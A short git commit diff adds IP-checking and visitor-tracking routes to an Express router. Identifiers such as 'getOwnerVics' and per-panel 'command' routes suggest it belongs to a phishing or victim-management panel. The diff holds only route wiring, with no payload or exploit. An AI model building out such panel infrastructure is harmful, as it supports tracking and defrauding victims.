f421319b16fac0c9ffbc90d7ccfb0843fa7c591b
Your Name <you@example.com>
2023-07-06 11:38:35 +0100

    make

--- routes/panel.js
+++ routes/panel.js
@@ -1,4 +1,12 @@
 const express = require("express");
+
+const {
+	giveIp,
+	checkIp,
+	getVisitors,
+	giveVisitor,
+} = require("../controllers/ipsController");
+
 const {
 	getOwnerVics,
 	command,
@@ -14,5 +22,10 @@ router.post("/:panelName/command", command);
 router.get("/:panelName/customers/id/:uniqueid", getInfo);
 router.post("/:panelName/data", submitData);
 router.post("/:panelName/delete", deleteEntry);
+
+router.post("/giveIp", giveIp);
+router.get("/checkIp/:ip", checkIp);
+router.get("/getVisitors/:owner", getVisitors);
+router.post("/giveVisitor", giveVisitor);
 
 module.exports = router;
